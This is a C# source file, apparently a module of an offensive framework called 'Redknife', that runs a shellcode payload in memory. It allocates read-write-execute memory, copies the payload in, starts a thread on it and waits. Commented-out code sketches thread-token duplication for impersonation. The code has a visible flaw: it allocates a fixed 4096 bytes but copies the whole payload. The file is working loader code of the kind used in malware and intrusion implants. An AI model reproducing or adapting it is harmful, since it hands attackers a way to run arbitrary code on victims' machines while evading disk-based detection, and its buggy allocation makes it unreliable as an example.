using System;
using System.Runtime.InteropServices;
using Redknife.APIs;

namespace Redknife.Modules
{
    public class SpawnNewThread : BaseModule
    {

        public override void Run()
        {
            LogUtil.Debug("Spawning new thread for payload");

            int size = this.Payload.Length;
            LogUtil.Debug("Allocating memory for payload, size: " + this.Payload.Length + " bytes", 1);
            IntPtr addr = Kernel32.VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            LogUtil.Debug("Copying payload to allocated memory", 1);
            Marshal.Copy(this.Payload, 0, addr, size);

            // Get current thread token
            //IntPtr hToken;
            //Advapi32.OpenThreadToken(Kernel32.GetCurrentThread(), 0xF01FF, false, out hToken);

            // Create the new thread
            LogUtil.Debug("Creating new thread to execute payload", 1);
            IntPtr hThread = Kernel32.CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            /*
            // Non-zero value indicates current thread is using impersonation 
            if (hToken != IntPtr.Zero)
            {
                LogUtil.Debug("Current thread has impersonation privilege - creating new thread with duplicated token");

                IntPtr hDuplicatedToken = IntPtr.Zero;
                Advapi32.DuplicateToken(hToken, (int)Advapi32.TOKEN_ALL_ACCESS, ref hDuplicatedToken);
                //Advapi32.DuplicateTokenEx(hToken, Advapi32.TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out hDuplicatedToken);

                // Set the duplicated token on the new thread
                Advapi32.SetThreadToken(hThread, hToken);
            }*/

            // Resume the thread
            //LogUtil.Debug("Resuming new thread");
            //Kernel32.ResumeThread(hThread);

            LogUtil.Debug("Waiting for thread execution");
            Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

    }
}
